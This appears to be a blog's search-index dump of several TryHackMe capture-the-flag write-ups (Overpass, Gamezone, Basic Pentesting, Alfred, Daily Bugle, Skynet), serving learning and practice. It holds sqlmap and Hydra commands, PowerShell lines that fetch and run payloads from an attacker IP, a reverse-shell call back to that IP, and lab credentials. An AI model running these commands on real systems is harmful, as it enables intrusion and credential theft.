fun.Free/Subscriber: FreeDifficulty: EasyEnumerationThere are four ports accessible on the target system from the initial nmap scan (top 1000 ports): 21 (FTP) 22 (SSH) 80 (HTTP) 111 (RCP)From the service information for SSH, the target is an Ubuntu Linux target.I’m not too familiar with the RPC protocol along with the rpcinfo output but we can add it to our list of things to learn.HTTPAs always, the first thing we should do with a web application is to explore it.In this case, there doesn’t appear to be anything other than an introduction to the room and an explanation of it being a Green Arrow themed room.With no information in the page source, hyperlinked references, no robots.txt, let’s move on to some directory enumeration using gobuster.The directory enumeration scan returned one result for /island. Browsing to it,There doesn’t appear to be a code word. It may be hidden in the source code!There we go! The code word is vigilante. Trying this out as a URL endpoint did not lead us anywhere. Nor did trying vigilante:vigilante for the FTP or SSH services. This may be useful later but let’s perform a subsequent gobuster scan on the /island endpoint.Ouuuu! Another hidden endpoint that probably has more information. However, there was nothing present to us on the actual page. Viewing the page source, there is a hint as a comment.The first time I completed this room, I didn’t know how to proceed from here so I viewed a hint on a walkthrough to make sense. It is a bit cryptic but thinking about it logically, it makes a bit of sense. On this /island/2100 endpoint, we can find our ticket with a .ticket extension.We can add the -x extension flag to gobuster to search for files with a .ticket extension.We found the ticket! Checking it out, it is just a text file with the following content.This is just a token to get into Queen's Gambit(Ship)RTy8yhBQdscXThe token looks like it has some sort of encoding on it but I first tried using it as the password for the FTP and SSH services with the potential username, vigilante.That didn’t work so perhaps it is encoded. I tried the standard base64 encoding but when that failed, I used CyberChef to quickly try out a bunch of encodings.Base58 was the correct encoding scheme! Now, let’s try to use the potential credentials vigilant:!#th3h00d to access the FTP or SSH services!The credentials granted us access to the FTP server. Listing the content in the directory, there are three images present. Let’s download them onto our local system and begin to analyze them.For the first image file that we encountered, exiftool reports that the File format error is incorrect. Performing a hexdump of the first few lines which contains the header information, the first six bytes appear to be incorrect as they should be 8950 4e47 0d0a 1. Using hexeditor, we can modify these first six bytes to match the correct PNG header format.If we updated the bytes correctly, we should be able to view the image’s metadata using exiftool.Great! Now, let’s view the actual image.This may be useful for the other images but let’s explore further.Initial FootholdFor JPEG images involving steganography, my go-to technique is to extract any hidden data using steghide. If it requests a passphrase, I use stegseek to crack the passphrase with the rockyou wordlist.Using steghide on the aa.jpg image requested a passphrase. That is probably what the purpose of the previous image was for which we fixed the PNG header. Using password as the passphrase to the steghide prompt, the tool extracted the hidden data to ss.zip.Unzipping the zip file, there are two files within it. The passwd.txt file does not actually contain any passwords or even a dump of the /etc/passwd file.This is your visa to Land on Lian_Yu # Just for Fun ***a small Note about itHaving spent years on the island, Oliver learned how to be resourceful andset booby traps all over the island in the common event he ran into dangerouspeople. The island is also home to many animals, including pheasants,wild pigs and wolves.The shado file’s contents may be more helpful with a potential password.M3tahumanWe already have the password for the vigilante user. There may be another user on the system that we haven’t encountered so far.Thinking back to the FTP server, the files were served from vigilante’s home directory.We connected to the FTP server dropping into the home directory. Moving up a level and checking the users that have a home directory (alternatively reading the /etc/passwd file), we know that slade is another user.Let’s use the credentials slade:M3tahuman to try to authenticate to the target through SSH.Success! We can grab the user.txt flag at /home/slade/user.txt and continue onto privilege escalation.Privilege EscalationListing out the sudo privileges of slade as we know his password.With the ability to execute pkexec as sudo, we should be able to just pass /bin/bash as an argument to obtain root access 2.We can submit the contents of the root flag to THM and complete this room!References https://en.wikipedia.org/wiki/Portable_Network_Graphics#/media/File:PNG-Gradient_hex.png &#8617; https://gtfobins.github.io/gtfobins/pkexec/#sudo &#8617; " }, { "title": "Overpass (Try Hack Me)", "url": "/posts/thm-overpass/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-19 11:15:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.ScenarioTitle: OverpassDescription: What happens when some broke CompSci students make a password manager?Free/Subscriber: FreeDifficulty: EasyEnumerationFirst things first, we’ll enumerate the services accesible on this target.There are two open ports on this target: 22 (SSH) 80 (HTTP)The service information of SSH reveals that this is an Ubuntu Linux target. Also, something that we have not encountered is that the HTTP application is served by a Golang HTTP server.HTTPFrom the landing page and the About Us section, Overpass is a password manager that allows you to keep your passwords safe using “military grade” encryption.We’re able to download the source code and build script from the Downloads page.Reading through the source code, it’s not complicated to understand how the Overpass software works. However, there’s not much we can utilize from this to obtain our initial foothold into the system.Performing a Gobuster scan, we come across a few endpoints that we have already encountered.One endpoint that we have not come across however is the /admin page.Browsing to the page, we’re presented with an administrator login prompt.I tried a few things such as brute forcing the authentication using Hydra as well as performing more detailed gobuster scans on subsequent endpoints but there was no information revealed.I viewed the page source of the Administrator area and started to understand the authentication process.A file that stands out from within the source code which is linked in the administrator page is login.js.The source code reveals that Javascript was performing an asynchronous request for every authentication attempt through the web browser.If the credentials were incorrect, the page would be updated with “Incorrect Credentials”. However, if the credentials were correct, the application would set a cookie, “SessionToken”, and redirect us to /admin.What if we could just set the cookie ourselves with any value and the backend would accept that providing us access as an administrative user.Trying out a few different values for the cookie, false worked for us.I’m not sure why false would grant us access when true didn’t but that’s fine! We now have access!We have two pieces of information that we can use to obtain our initial foothold: SSH Private Key Potential Username: jamesInitial FootholdCopying the private key to our attacker system, we know it is protected by a passcode so let’s use John the Ripper to crack the passcode.Once logged in as James, we find two files in his home directory. The first file is the user.txt flag which we can submit to the THM room.The second file is a todo.txt file containing remaining tasks for James to complete?To Do:&gt; Update Overpass' Encryption, Muirland has been complaining that it's not strong enough&gt; Write down my password somewhere on a sticky note so that I don't forget it. Wait, we make a password manager. Why don't I just use that?&gt; Test Overpass for macOS, it builds fine but I'm not sure it actually works&gt; Ask Paradox how he got the automated build script working and where the builds go. They're not updating on the websitePoints 1 and 3 may not be very helpful to us. However, point 2 implies that James is storing his system password using the Overpass password manager and point 4 may indicate the presence of a cron job.Let’s focus on point 2 and obtain James’ password. Searching for the overpass binary on the system using which overpass, it is available at /usr/bin/overpass. Running it with option 4,Great! We have James’ password. Trying to list out James’ sudo privileges and it appears he does not have any. Let’s move on to point 4 then and search for any cron jobs.There is one cron task that is running every minute to download the buildscript from the Overpass web application’s download page and executing it. This cron task is running as the root user.Privilege EscalationWHat is interesting is that it is pulling the buildscript.sh file through the overpass.thm address. If we could modify the /etc/hosts file to associate our attacker system’s IP address to overpass.thm, we could serve a malicious payload to catch the shell as root.Listing out the permissions of /etc/hosts file, the file is world readable and writable which is definitely not the typical permission scheme for this file.First, we need to set up a netcat listener to catch the reverse shell payload from the cronjob execution. Second, we need to set up a simple Python HTTP server to serve the malicious payload. The malicious payload is located at /downloads/src/buildscript.sh which is what the cron job is requesting.We’ll update the entry in /etc/hosts to overpass.thm to point to 10.6.5.103 instead of 127.0.0.1.Once our netcat and Python servers are configured, all we can do is wait. This should be a few seconds since the cron job executes every minute.Woot woot! We got root!All we need to do is read the flag at /root/root.txt and submit it to THM to complete this room.ReflectionThis room focused on very different techniques to abuse our privileges to obtain root. It focused on modifying the /etc/hosts file to hijack a cronjob’s regular build script to obtain a root shell.On top of that, there were opportunities to crack passwords, read Javascript source code, and perform standard enumeration techniques." }, { "title": "Gamezone (Try Hack Me)", "url": "/posts/thm-gamezone/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-19 00:10:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.ScenarioTitle: GamezoneDescription: Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!Free/Subscriber: SubscriberEnumerationThe target has 2 open ports: 22 (SSH) 80 (HTTP)From the version information specified for services, SSH and HTTP, the target is likely an Ubuntu Linux OS.In the nmap scan results, the HTTP application is served by Apache 2.4.18 along with the backend programming language likely being PHP based on the information that there is a PHPSESSID cookie.HTTPLet’s browse to the application served on port 80.This web application appears to be related to video games with some default text in the Recent Reviews entries.Browsing the application further, there are no additional linked pages to browse to. There is no robots.txt file, no information leaked in the page source, and the only directory that Gobuster could locate was a /images folder.The /images directory is also a dead end as it contains actual images for the web application and nothing we could utilize.SQLiWhat we have not tried yet is logging into the application. Trying to authenticate with the credentials admin:password just brought us back to the index page with no error message.We could brute force the application but let’s try a simple SQL injection payload to bypass authentication.With the above payload, we obtained accessed to the protected portal.The portal is prompting us to search for a game to review. This is likely connecting to a database and querying for the reviews. If we enter an empty string, we obtain a dump of the reviews.Looking back at the login page, we know that this is vulnerable to SQL injection. We can use sqlmap to dump ALL of the data. This includes the actual password for the admin user who’s account we bypassed.We need to know the structure of the POST request so we can include the parameters in the sqlmap command. Monitoring the network traffic in Firefox for a normal authentication request, let’s capture the POST request payload.Construct the sqlmap request based on information from the POST request payload:sqlmap -u http://10.10.218.150/index.php -data \"username=admin&amp;password=password\"I’m only displaying the end result of the sqlmap command but the username parameter of the post payload has an injection point which we already knew!But now we can use other command line options to enumerate the databases, tables, and a dump of the data.This method was taking a VERY long time. Looking at the above picture, the method used for injection on the username parameter on the authentication page is time-based blind. I’m confident this is why enumerating the databases was painfully slow. This may not be the right vector.I was a little stumped. Although I was impatient, I started reading through the room’s information which guided you through exploiting this target. The room showed a similar method for bypassing the authentication page as we did but then used sqlmap to find an injection point for the search functionality on the portal endpoint. This also confirms that submitting a request on the portal communicates with the database to obtain results.SQLi Portal ParameterWe can try to use sqlmap on the searchitem parameter when submitting a query for book reviews on the portal page.Using sqlmap, we’ll attempt to use the searchitem parameter as the injection point and enumerate the databases. One other piece of information we will need before we proceed with using sqlmap is the cookie generated once we bypassed the authentication.With all of the required information, the following sqlmap command will locate the injection point and return the list of accessible databases.sqlmap -u http://10.10.218.150/portal.php --cookie \"PHPSESSID=3ig4hjbgdun7uvksnmduptpl87\" --data \"searchitem=test\" -p \"searchitem\" --dbsI’ve shortened the output of the image below to only include the relevant information but it is the output of the above sqlmap command.From the list of available databases, the one database that is not part of the default in MySQL is db. Let’s dump the contents of this database.We need to modify the previous command slightly to specify a specific database and to dump the contents of it.sqlmap -u http://10.10.218.150/portal.php --cookie \"PHPSESSID=3ig4hjbgdun7uvksnmduptpl87\" --data \"searchitem=test\" -p \"searchitem\" -D db --dumpThe database db contained two tables, users and post. The post table looks like the contents that the Portal was querying for reviews. However, the users table contains a hash for the username agent47.Let’s try to crack this hash.John the RipperFirst, we need to determine the type of hash it is. For this, we’ll use hash-identifier.We can use John the Ripper with the Hash format of Raw-SHA256 (this can be found by john --list=formats) to crack this hash. Saving this hash to crackme.txt, let’s run this.Success! This might be our initial foothold through the SSH service which we have neglected so far.Initial FootholdFantastic! We have obtained our initial foothold and we can proceed to privilege escalation. Before we do that, let’s grab the user.txt flag located at /home/agent47/user.txt and submit it to THM.Privilege EscalationReading the description of the room gave a very slight hint on how to escalate our privileges on this target. “Reveal services using a reverse SSH tunnel” means that there is a hidden service that we can use with SSH local port forwarding for us to be able to access from our attacker machine.SSH Local ForwardingAs part of the privilege escalation vector, let’s list out the services listening on the tareget system.We are already aware of ports 22 and 80. The port 3306 is listening locally which is the MySQL database. The remaining port, 10000, is not something we have encountered so far and is not available to access from outside of the target.We’re not aware exactly of what service is running on this port but let’s assume it is a webpage and try to curl the service.Curling the response headers proves that it is a web application. Perfect! We can set up an SSH local port forward so that we can access the hidden web application directly from our attacker system.The SSH local port forwarding will set up a listener on our local machine at port 8000 redirecting all traffic to 127.0.0.1 on port 10000 using the target machine at 10.10.111.5 as the jump server.Since the service that we want to forward our traffic to is on the same system as the jump server, we use 127.0.0.1 as the address.We can check the listening services on our attacker system to verify that there is a service listening on port 8000.Perfect! If we browse to http://127.0.0.1:8000, we should be redirected to the web application served on port 80 on the target system.WebminWe’re presented with an authentication page to a web application, Webmin. As a hunch, let’s use the credentials for agent47.Perfecto! Reading through this initial page, we’re presented with information about the operating system along with the Webmin version. Perhaps there is an exploit available for this specific version of Webmin.A quick Google search reveals that there is! The specific vulnerability is CVE-2012-2982 which allows an authenticated user to exploit a vulnerability in the /file/show.cgi component to execute arbitrary commands.Webmin ExploitUsing this Python script which implements the vulnerability, it will use a payload to send a reverse shell back to our attacker system on a port.Let’s set up a netcat listener on port 4444 and execute the script. The script requires five command line arguments: URL (we need to specify the port as well in this URL) username password ip address that netcat is listening on port that netcat is listening onIf we switch to our netcat listener, we’ll see a reverse shell that we caught as the root user.Now that we have a shell as root, all we need is the root.txt flag found at /root and we are done!ReflectionOther than the minor hint for the SSH local port forwarding from the description of the room as well as the mistake to read the walkthrough for the sqlmap on the Portal page, we didn’t hit many roadblocks.This is probably the first room I’ve encountered that required the use of SSH port forwarding which is a great way to learn. On top of that, it provides practice exploiting a webmin server with publicly available exploits.Useful CommandsSSH Local Port ForwardThe general syntax of the SSH Local Port Forward is:ssh 6789:10.0.0.20:8000 test@10.0.0.10The above command means configure a local listener on port 6789, connect to the SSH service on 10.0.0.10 as the user test, and forward all traffic from the SSH server 10.0.0.20 on port 8000." }, { "title": "Basic Pentesting (Try Hack Me)", "url": "/posts/thm-basic-pentesting/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-17 18:00:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.ScenarioTitle: Basic PentestingDescription: This is a machine that allows you to practice web app hacking and privilege escalation.Free/Subscriber: FreeEnumerationFrom the version information for the SSH and HTTP services, the target is an Ubuntu Linux OS.There are six open ports: 22 (SSH) 80 (HTTP) 139/445 (Samba/SMB) 8009 (Apache Jserver) 8080 (HTTP)The NetBIOS ports, 139 and 445, usually go hand in hand to serve SMB or Samba services.SMBBeginning with SMB, let’s try to list the shares hosted on the server as an unauthenticated user.Looks like there is one available share, Anonymous, that we may be able to access. The IPC$ share is usually not accessible unauthenticated. Let’s see if we can connect to the share and list the files.We accessed the share unauthenticated which has one file, staff.txt. Within the image, the file contents are an all-staff announcement to not dump items in the share. There isn’t much useful information in the message but thinking about this a bit, there are two key pieces of information leaked from the file. jan kayThese are potentially two username that we can use to our advantage to brute force into other services hosted on the target or to protected endpoints of the web applications.HTTP (80)Browsing to the web application on port 80, we’re presented with the landing page indicating that the website is undergoing maintenance.Maybe there’s some information hidden in the page source.Looks like there might be a dev section hidden behind an endpoint that is not publicly accessible. Let’s use Gobuster to search for it.Woot! We found the dev section as /development. It’s a directory index listing with two text files, dev.txt and j.txt.The dev.txt file contains,2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neatto host that on this server too. Haven't made any real web apps yet, but I have tried that exampleyou get to show off how it works (and it's the REST version of the example!). Oh, and right now I'musing version 2.5.12, because other versions were giving me trouble. -K2018-04-22: SMB has been configured. -K2018-04-21: I got Apache set up. Will put in our content later. -JThe j.txt file contains,For J:I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,and I was able to crack your hash really easily. You know our password policy, so please followit? Change that password ASAP.-KThe above two text files provide varying pieces of information. Struts might be referring to Apache Struts which may be the application on port 8080. Jan appears to have a weak password according to Kay so we could potentially use that to our advantage to brute force the SSH serviceInitial FootholdSSH Brute ForceLet’s use Hydra to brute force Jan’s password. It’s been a while since I covered the format of the Hydra command so I’ll summarize it briefly.hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.103.246 ssh -l jan: Use the username jan for the brute force authentication against SSH -P rockyou.txt: use the following list of passwords to test 10.10.103.246: target IP address ssh: service to brute force against, ssh requires no additional parametersSuccess! We have our initial foothold into the target system.Privilege EscalationJan contained no useful files within her home directory that could be utilized for privilege escalation. Searching for other user directories in /home, there is the home directory for the user kay that we encountered earlier from the all-staff email.Kay has a pass.bak file but is only readable as Kay. The .ssh directory is accessible to us however.For directories, the x bit in the permission scheme means change into, so it’s accessible by anybody in this case.Checking the directory, kay has a private key generated for himself. We may be able to use this SSH key to perform some horizontal privilege escalation and log into the system as Kay.This failed as the key is password protected but no matter! We can copy it over to our attacker workstation, convert it to a file that John the Ripper can use to brute force using ssh2john, and crack the passcode with the rockyou.txt wordlist.With access to the passcode for Kay’s private key, let’s re-run the SSH command to log into the system as Kay.Checking out the pass.bak file, it looks like it’s the password for Kay’s user. Listing out the sudo privileges for Kay, he has full administrative privileges to the system. Running sudo su, we have obtained a root shell!Looks like there’s a flag in /root indicating that we have completed this challenge so we can be done. Success!ReflectionAlternate Initial FootholdReading through the final flag, it looks like there is an additional vector for obtaining our initial foothold as well as performing privilege escalation.My hunch is that this has to do with the Apache Struts comment found in the /development index along with the web application on port 8080. We did not enumerate those fully so let’s explore those a bit.This is a typical Apache Tomcat deployment with the Manager App which I have encountered before to deploy malicious WAR payloads to obtain a reverse shell through as an Administrative user.I tried to brute force my way through the application to the Administrative panel but that was not possible through either the default credentials or Jan/Kay’s username.After a bit of time unsure on how to approach this and using the default Metasploit options for the module that can exploit this Apache Struts version, nothing was working. Taking a step back, I thought about the note a bit more and identified key pieces of information about the “Showcase Example”.Looking at this example of abusing the Apache Struts example, we have an idea of the URL structure for the showcase example and an endpoint that we can access. Let’s see if we can access this.Fantastic! We finally found the URL to access the Apache Struts example. Let’s update the Metasploit options to reflect this.The following image is the original set of Metasploit options for this module.I updated the Metasploit options to reflect the new URL and the target information.Running the module,we obtained a shell as the tomcat9 user!Alternate Privilege EscalationWe could use the original technique through Kay’s .ssh folder that we used for privesc but let’s try to find the alternate method.As one of the privesc techniques, let’s list out the SUID binaries.One of the binaries stands out, vim.basic, which we can use to abuse our privileges. Since the SUID bit is enabled on this binary, we can run the file impersonating as the user that owns the binary which is root in this case.This means, we can view Kay’s pass.bak file and switch into Kay’s user account. With those two techniques, we have found both methods to obtain our initial foothold as well as both methods to escalate our privileges.With every aspect of this room covered, we have fully completed it!" }, { "title": "Alfred (Try Hack Me)", "url": "/posts/thm-alfred/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-14 22:45:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.ScenarioTitle: AlfredDescription: Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.Free/Subscriber: SubscriberEnumerationThe task description indicated that the host does not respond to ping requests which is why we added the -Pn flag to our nmap scan.From the scan results, the target is a Windows OS with three open ports: 80 (HTTP) 3389 (tcpwrapped) 8080 (HTTP)HTTP (80)Browsing to the web application served on port 80, the index page displays a picture of Bruce Wayne and a donations request to alfred.A few of the steps to enumerate this application: Check for robots.txt Check the page source Hidden directories using the 2.3-small.txt fileNone of these returned any results that we could use. Apart from exploiting the old IIS version (current version is 10.0.x), the application at port 8080 may be a more useful vector.HTTP (8080)Jenkins is a CI/CD pipeline tool used to automate builds and deployments. This already looks to be more promising than the application we just visited. Now, if only we had credentials.I performed the same initial enumeration checks that I performed on port 80 but similarly, there were no endpoints that were accessible as an unauthenticated user.Determining the Jenkins version for any available exploits 1On the bottom-right text, the version of this Jenkins is 2.190.1 with no available exploits (not that I looked that hard), unfortunately.The default credentials for Jenkins is admin:password but that didn’t work either. Our next resort is to try to brute force the Jenkins login form.Wow! I can’t believe I didn’t try admin as the password but we have our way into the target.Initial FootholdWe have access to the CI/CD project and build space. As an administrative user, we have the ability to create a project and execute commands that are a part of the build process 1.There is already a project created along with a completed build! Checking out the build’s console output,the build is executed by cmd.exe. We should be able to take advantage of this and generate a reverse shell for ourselves as alfred\\bruce. We’ll use the download and execute in-memory method to trigger a reverse TCP Powershell script 2 using Nishang’s reverse TCP Powershell script. The only modification we need to make is add a line at the bottom of the script to invoke the function to connect back to our netcat listener on our attacker system.Invoke-PowerShellTcp -Reverse -IPAddress 10.6.5.103 -Port 4444When this script is downloaded onto the target system, the reverse shell function will automatically execute. But, we need to get the file from our attacker system onto the target system.We can invoke a Powershell expression to download the file using the “Net.WebClient” object 2. Before we modify the build configuration, we need to serve the Powershell script using Python’s http.server module and create a netcat listener on port 4444 to catch the reverse shell.It took me 8 attempts to modify the command and update the build configuration before I caught the reverse shell. After I slowed down and inspected the reference 2, it was easier to recognize the mistakes and get the correct command format.Once we save the build configuration and execute the build, we should see a log entry in our HTTP server and the reverse shell connection as alfred\\bruce.Woot woot! Let’s grab the user flag at C:\\Users\\bruce\\Desktop\\user.txt and move on to privilege escalation.Privilege EscalationWindows privilege escalation is a very new topic so the first item in the checklist I came across was to search for tokens using whoami /priv.The SeImpersonatePrivilege is one that I have come across before. Many of the resources recommended the JuicyPotato exploit to abuse this privilege which I did not use the first time I completed this room.The first time I completed this room, I used the THM recommendations to generate a Meterpreter payload that connects back to a handler on the attacker system. Within Meterpreter, you can load the incognito module and impersonate the token fairly easily.This time, we’ll follow the steps documented in this article to use the JuicyPotato exploit and obtain a reverse shell as SYSTEM.First things first, we’ll download the JuicyPotato.exe and nc64.exe binaries to the target system after serving it from our attacker system using Python’s http.server module.We can use the following command to download the nc64.exe file from the Python web server.powershell \"IEX(New-Object Net.WebClient).downloadFile('http://10.6.5.103/nc64.exe', 'C:\\Users\\public\\nc64.exe')\" -bypass executionpolicyOnce the JuicyPotato.exe file is present, establish a second netcat listener and execute the JuicyPotato binary specifying the COM listening port, program to execute (netcat connection to our listener with the -e flag), and createprocess arguments.In the image below, you can see the command execution of the JuicyPotato exploit on the left, and the connection from the target to our netcat listener as SYSTEM. We have obtained root!We can search for the root.txt flag,and consider this room completed.Useful CommandsPowershell Download FileIf we want to download a PS1 script and execute in memorypowershell \"IEX((New-Object Net.WebClient).downloadFile('http://10.6.5.103/script.ps1'))\"With this method, ensure the script has the expression(s) to invoke a function or method.Alternatively, if you want to download an executable file and execute itpowershell \"IEX((New-Object Net.WebClient).downloadFile('http://10.6.5.103/shell.exe'))\"Start-Process shell.exeReflectionThis is the first Windows room I have encountered in this journey to redo these Try Hack Me rooms including a writeup. Dealing with a Windows room including privilege escalation seems very foreign to me. The most privesc I can complete for Windows involves getsystem on Metasploit but one of the big accomplishments I felt this time around was completing this room with no hints AND without using Metasploit.Along with being foreign to Windows targets and privilege escalation, the JuicyPotato exploit completely went over my head. At some point in this journey, I’ll perform significantly more research into Windows privilege escalation and these Impersonation tokens.Lastly, this room provides the opportunity to use Powershell scripts, exposure to the Jenkins system and abusing the build system with RCE, exposure to Windows and using a manual or Metasploit privesc techniques. This room has it all!References https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins &#8617; &#8617;2 https://kalilinuxtutorials.com/nishang/ &#8617; &#8617;2 &#8617;3 " }, { "title": "Daily Bugle (Try Hack Me)", "url": "/posts/thm-daily-bugle/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-13 21:30:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationFrom the initial nmap scan results, there are three open ports: 22 (SSH) 80 (HTTP) 3306 (MySQL)Some of the information obtained from the nmap scan: The web application is an Apache server with PHP as the backend language Tons of disallowed entries in the robotx.txt file Target is likely a CentOS OS as indicated in the version information for SSH The web application is a Joomla CMS (likely an open source product)There is lots to look into so let’s get started!SSHNo information leaked in the banner and no potential credentials for an effective brute force so we may have to come back to this.MySQLThere is an open MySQL port but connections established from outside of the target environment are usually blocked (only localhost connections). Let’s verify this.Nothing much to build off of here either so the web application may be our source of information.HTTPExploring the web application’s landing page.We already know that there are many disallowed entries in the robots.txt file. Before we explore the web application further, we should use our google-fu skills to determine if Joomla is a vendor supported CMS product.JoomlaThrough a bit of research, Joomla is a CMS with also many exploits and vulnerabilities. We need to determine the version of the CMS to use specific vulnerabilities. Checking for the joomla.xml file in /administrator/manifests/files, the contents contain the exact version for this CMS 1.using searchsploit for that exact version,there is an SQLi vulnerability present. Awesome! Let’s copy the file and analyze the contents of the second exploit in that list using searchsploit -m 42033.txt.SqlmapThe exploit provides a bit of information on the vulnerable URL and even provides the exact sqlmap command required against the target.Running the command but replacing the target URL,there are five databases present. We can now use sqlmap to dump the data of joomla, and test as the other three are default databases in MySQL.After fiddling around with sqlmap to dump the database and exploiting the CMS with a Metasploit framework for a while, neither techniques were producing any results. For some reason, despite sqlmap finding an injection point, it was retrieving lots of 500 server errors and unable to get column information. Peeking at the THM hint, it said “Why not use a Python script instead of sqlmap”. I should curse myself for peeking at the hint instead of trying other avenues. Oh well.A quick google search for “Joomla 3.7 exploit” and the second results points to a Github repository with a Python script 2.Honestly, it was right there.JoomblahThis was a point-and-click type of exploit requiring no modifications.The script dumped the information of the “Super User” with the username, email, and a hash (Blowfish).Perhaps John the Ripper with the rockyou wordlist can crack this for us.Woot! Now, we have administrative access to the Joomla CMS.Initial FootholdExploring the panel a bit, there were a LOT of sections and potential pathways to create a reverse shell. However, we can follow this article by hackingarticles.in on uploading a reverse shell within the Joomla CMS.We’ll modify the Beez3 template’s index.php file with a reverse shell 3. Next, we’ll set up a netcat listener on the IP address and Port configured in the payload. Lastly, we need to trigger the reverse shell connection by clicking on Preview Template within the administrative panel.We have obtained a shell as the apache user. Let’s try to escalate our privileges to root or a local user.Privilege EscalationDatabase CredentialsSearching through the filesystem with the limited access that we had, the web application’s root directory had the configuration.php file with the password to the MySQL database.I first tried the password for the root user but that didn’t work. Looking at the /home directory, there was one user directory present for jjameson. The database password provided us access to the jjameson user’s account.YumNow, we need to try to obtain root access! Let’s list out jjameson’s sudo privileges.jjameson is able to run yum as root with no password. Let’s check if gtfobins as an entry on how to abuse this privilege as sudo.The first option did not pan out since the target didn’t have the fpm command installed. The second option did not require any modification and we obtained a shell as root by following the exact instructions.Obtaining the flag located at /root/root.txt, we have completed this room!ReflectionWithout realizing it the first time I completed this room (mostly through the helpful questions/prompts provided by THM), I didn’t realize this room was rated as Hard. I think it might be more appropriate as a Medium difficulty room because of identifying where sqlmap is failing and being able to search for an appropriate solution.Otherwise, a bit of a challenging room that I’m not sure if I could’ve solved with the one hint that I used today. Lots of opportunity to learn how to use public exploits, thinking outside of the box to obtain user access, and privilege escalation using yum.References https://hackertarget.com/attacking-enumerating-joomla/ &#8617; https://github.com/stefanlucas/Exploit-Joomla &#8617; https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php &#8617; " }, { "title": "Skynet (Try Hack Me)", "url": "/posts/thm-skynet/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-12 21:00:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationThe first thing is to recognize the services that are available so we can identify a vulnerability or pathway into exploiting this target.We’ll kick things off with an nmap scan of the top 1000 ports.Open ports: 22 (SSH) 80 (HTTP) 110 (POP3) 139/445 (Samba) 143 (IMAP)Let’s explore each service in further detail.SambaWith open SMB ports, many sysadmins do not configure the services to prevent unauthenticated users to list the shares. Let’s see if that’s the case here.There are two shares that might contain interesting data, anonymous and milesdyson.The share, milesdyson, denied us access as we may need credentials to access that share. The anonymous share granted us unauthenticated access and contained some txt files!There were two files that contained content, attention.txt and log1.txt. Let’s dump the contents of the two files. attention.txtA recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.-Miles Dyson log1.txtcyborg007haloterminatorterminator22596terminator219terminator20terminator1989terminator1988terminator168terminator16terminator143terminator13terminator123!@#terminator1056terminator101terminator10terminator02terminator00roboterminatorpongterminatormanasturcaluterminatorexterminator95exterminator200dterminatordjxterminatordexterminatordeterminatorcyborg007haloterminatoravsterminatoralonsoterminatorWalterminator79terminator61996terminatorThe system requires all skynet employees to change their password but we also have a potential password list to use. This may be helpful for brute forcing SSH, POP3/IMAP, or even a protected endpoint in the web application.With the only user that we have come across as “Miles Dyson”, we could use an educated guess of “milesdyson” being a potentially valid username against the available services. Now, we can use Hydra with milesdyson and the potential password list against SSH, IMAP, and POP3. Unfortunately, the credentials were not valid for those services. There may be other username formats we could try but let’s explore the web application before attempting more brute force attempts.HTTPEerily similar to the Google search bar, the index page contains no functionality, no information in the source code, and the web application contains no robots.txt file.GobusterChecking out most of the endpoints led to Forbidden Access but the /squirrelmail endpoint led us to a login page!Maybe hydra with the previous brute force attempts will work here!HydraWe need to capture two pieces of information, a failed authentication attempt and the request details.For the failed authentication attempt, we’ll throw some bogus credentials to search for some text indicating that the authentication attempt was a failure.Next, let’s capture the request in Burpsuite to understand the endpoint the request is being submitted to along with the request payload.So the request is being submitted to /squirrelmail/src/redirect.php and the we can see the payload variables being sent to the web server. Three of those variables should remain static in our Hydra attack and only secretkey should be variable.Awesome! The hydra request is a bit lengthyl but it combines all of the information we have gathered swapping out the password for “^PASS^” so Hydra can populate it with the passwords from the password list.Squirrel MailWith access to milesdyson’s inbox, there are three emails, one of which is a “system” generated email with his new Samba password while the other two contain no useful information.We have changed your smb password after system malfunction.Password: )s{A&amp;2Z=F^n_E.B`We should now have access to his Samba 